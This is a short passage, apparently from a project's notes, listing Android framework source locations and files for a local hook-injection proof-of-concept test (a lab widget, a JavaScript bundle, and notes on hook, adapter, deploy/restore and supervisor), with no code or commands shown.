  `AppErrors.java:668`; `system/core/libprocessgroup/processgroup.cpp:347`;
  `AlarmManagerService.java:5093,5160`; `JobSchedulerService.java:967`.
- `telegramandroidwidget/lab/lab_widget_rel` + real `sandbox-bundle.js` (596,053 B) — local hook
  injection test.
- `notes/poc/*` — hook, adapter, deploy/restore, supervisor, test plan.
